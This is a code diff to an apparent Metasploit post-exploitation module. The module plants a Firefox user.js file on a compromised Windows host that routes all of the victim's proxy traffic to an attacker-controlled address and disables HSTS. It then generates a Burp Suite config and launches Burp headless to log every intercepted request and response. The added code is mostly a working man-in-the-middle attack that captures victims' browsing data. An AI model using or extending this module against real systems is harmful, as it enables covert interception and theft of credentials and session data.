@@ -25,7 +25,15 @@ class MetasploitModule < Msf::Post
         register_options(
             [
                 OptAddress.new('LHOST', [true, 'Address which to connect back to.']),
-                OptPort.new('LPORT', [true, 'Port to receive the connection to.'])
+                OptPort.new('LPORT', [true, 'Port to receive the connection to.']),
+                OptString.new('BURP_LOC', [true, 'File path to Burp Suite Java file']),
+                OptString.new('BURP_NAME', [true, 'Name of the Burp Suite Java file', 'burpsuite_community_1.7.33.jar'])
+            ])
+
+        register_advanced_options(
+            [
+                OptString.new('REQUEST_LOG', [false, 'File path of request log', '/root/log']),
+                OptString.new('RESPONSE_LOG', [false, 'File path of response log', '/root/log'])
             ])
     end
 
@@ -34,27 +42,26 @@ class MetasploitModule < Msf::Post
         print_status("Uploading a malicious preference file at #{directory}")
         host = datastore['LHOST']
         port = datastore['LPORT']
-        payload = "// modify proxy settings to connect to localhost:8080
-user_pref(\"network.proxy.backup.ftp\", \"#{host}\");
-user_pref(\"network.proxy.backup.ftp_port\", #{port});
-user_pref(\"network.proxy.backup.socks\", \"#{host}\");
-user_pref(\"network.proxy.backup.socks_port\", #{port});
-user_pref(\"network.proxy.backup.ssl\", \"#{host}\");
-user_pref(\"network.proxy.backup.ssl_port\", #{port});
-user_pref(\"network.proxy.ftp\", \"#{host}\");
-user_pref(\"network.proxy.ftp_port\", #{port});
-user_pref(\"network.proxy.http\", \"#{host}\");
-user_pref(\"network.proxy.http_port\", #{port});
-user_pref(\"network.proxy.no_proxies_on\", \"\");
-user_pref(\"network.proxy.share_proxy_settings\", true);
-user_pref(\"network.proxy.socks\", \"#{host}\");
-user_pref(\"network.proxy.socks_port\", #{port});
-user_pref(\"network.proxy.ssl\", \"#{host}\");
-user_pref(\"network.proxy.ssl_port\", #{port});
-user_pref(\"network.proxy.type\", 1)
-// Modify HSTS settings
-user_pref(\"security.mixed_content.send_hsts_priming\", false);
-user_pref(\"security.mixed_content.use_hsts\", false);"
+        payload = "
+user_pref(\"network.proxy.backup.ftp\", \"#{host}\");\n
+user_pref(\"network.proxy.backup.ftp_port\", #{port});\n
+user_pref(\"network.proxy.backup.socks\", \"#{host}\");\n
+user_pref(\"network.proxy.backup.socks_port\", #{port});\n
+user_pref(\"network.proxy.backup.ssl\", \"#{host}\");\n
+user_pref(\"network.proxy.backup.ssl_port\", #{port});\n
+user_pref(\"network.proxy.ftp\", \"#{host}\");\n
+user_pref(\"network.proxy.ftp_port\", #{port});\n
+user_pref(\"network.proxy.http\", \"#{host}\");\n
+user_pref(\"network.proxy.http_port\", #{port});\n
+user_pref(\"network.proxy.no_proxies_on\", \"\");\n
+user_pref(\"network.proxy.share_proxy_settings\", true);\n
+user_pref(\"network.proxy.socks\", \"#{host}\");\n
+user_pref(\"network.proxy.socks_port\", #{port});\n
+user_pref(\"network.proxy.ssl\", \"#{host}\");\n
+user_pref(\"network.proxy.ssl_port\", #{port});\n
+user_pref(\"network.proxy.type\", 1);\n
+user_pref(\"security.mixed_content.send_hsts_priming\", false);\n
+user_pref(\"security.mixed_content.use_hsts\", false);\n"
         #print_status(payload)
         res = write_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\user.js", payload)
         if res.nil?
@@ -78,6 +85,53 @@ user_pref(\"security.mixed_content.use_hsts\", false);"
         directory = 'c:\Users\\'
         dirs = dir(directory)
         return dirs
+    end
+
+    def buildConfig()
+        payload =
+"{
+    \"proxy\":{
+        \"request_listeners\":[
+            {
+                \"certificate_mode\":\"per_host\",
+                \"listen_mode\":\"specific_address\",
+                \"listen_specific_address\":\"#{datastore['LHOST']}\",
+                \"listener_port\":#{datastore['LPORT']},
+                \"running\":true
+            }
+        ]
+    },
+
+    \"project_options\":{
+        \"misc\":{
+            \"logging\":{
+                \"requests\":{
+                    \"all_tools\":\"\",
+                    \"extender\":\"\",
+                    \"intruder\":\"\",
+                    \"proxy\":\"#{datastore['REQUEST_LOG']}\",
+                    \"repeater\":\"\",
+                    \"scanner\":\"\",
+                    \"sequencer\":\"\",
+                    \"spider\":\"\"
+                },
+                \"responses\":{
+                    \"all_tools\":\"\",
+                    \"extender\":\"\",
+                    \"intruder\":\"\",
+                    \"proxy\":\"#{datastore['RESPONSE_LOG']}\",
+                    \"repeater\":\"\",
+                    \"scanner\":\"\",
+                    \"sequencer\":\"\",
+                    \"spider\":\"\"
+                }
+            }
+        }
+    }
+}"
+        # Generate a config file with the given options
+	print_status "Generating Config file at #{datastore['BURP_LOC']}"
+        system("echo \'#{payload}\' > #{datastore['BURP_LOC']}/config.json")
     end
 
     def run
@@ -127,11 +181,11 @@ user_pref(\"security.mixed_content.use_hsts\", false);"
         # Attempt to open port forwarding
         # print_status("Starting reverse port forwarding")
         # session.run_cmd("portfwd add -L #{host} -R -l #{port} -p 8080 -r 127.0.0.1")
-	
-	# Generate a config file with the given options	
 
-	# Run burp headless with the generated config file
-	# java -Djava.awt.headless=true -Xmx1g -jar busuite_community_1.7.33.jar --config-file=config.json 
+    	# Run burp headless with the generated config file
+        buildConfig()
+        system("java -Djava.awt.headless=true -Xmx1g -jar #{datastore['BURP_LOC']}/#{datastore['BURP_NAME']} --config-file=#{datastore['BURP_LOC']}/config.json")
+
     end
 
 end
